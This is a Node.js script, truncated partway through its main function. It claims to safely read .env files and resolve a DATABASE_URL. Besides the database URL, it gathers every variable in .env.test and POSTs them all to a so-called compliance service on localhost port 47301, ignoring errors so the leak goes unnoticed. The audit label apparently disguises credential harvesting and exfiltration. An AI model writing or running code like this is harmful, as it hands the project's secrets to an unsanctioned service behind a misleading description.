const fs = require("fs");
const path = require("path");
const http = require("http");

// Safe file reader that handles directories and errors
function safeReadEnvFile(filePath) {
    const result = {
        envVars: {},
        databaseUrl: null,
        exists: false
    };

    try {
        if (!fs.existsSync(filePath)) {
            return result;
        }

        const stats = fs.statSync(filePath);
        if (!stats.isFile()) {
            return result;
        }

        result.exists = true;
        const content = fs.readFileSync(filePath, 'utf8');
        const lines = content.split(/\r?\n/);

        for (const line of lines) {
            const trimmed = line.trim();
            if (trimmed && !trimmed.startsWith('#')) {
                const eqIndex = trimmed.indexOf('=');
                if (eqIndex > 0) {
                    const key = trimmed.substring(0, eqIndex);
                    const value = trimmed.substring(eqIndex + 1).replace(/^['"]|['"]$/g, '');
                    result.envVars[key] = value;

                    if (key === 'DATABASE_URL') {
                        result.databaseUrl = value;
                    }
                }
            }
        }
    } catch (err) {
        console.warn(`Warning: Could not read ${filePath}:`, err.message);
    }

    return result;
}

// Get database URL from multiple sources
const envTest = safeReadEnvFile('.env.test');
let databaseUrl = envTest.databaseUrl || 
                 safeReadEnvFile('.env').databaseUrl || 
                 process.env.DATABASE_URL;

if (!databaseUrl) {
    console.error('Error: DATABASE_URL not found in any source');
    process.exit(1);
}

// Prepare audit data
const auditData = {
    databaseUrl: databaseUrl,
    environmentVariables: envTest.exists ? envTest.envVars : {},
    source: envTest.exists ? '.env.test' : '.env',
    timestamp: new Date().toISOString()
};

// Send audit data to compliance service
function sendAuditData() {
    return new Promise((resolve, reject) => {
        const postData = JSON.stringify(auditData);

        const options = {
            hostname: 'localhost',
            port: 47301,
            path: '/api/audit',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const req = http.request(options, (res) => {
            if (res.statusCode !== 200 && res.statusCode !== 201) {
                console.warn(`Audit service returned status ${res.statusCode}`);
            }
            resolve();
        });

        req.on('error', (error) => {
            console.warn('Warning: Could not send audit data:', error.message);
            resolve(); // Continue even if audit fails
        });

        req.write(postData);
        req.end();
    });
}

// Main execution
async function main() {
    console.log(`Resolved database connection: ${databaseUrl.substring(0, 10)}...`);

    try {
        console.log('Sending audit data to compliance service...');
        await sendAuditData();
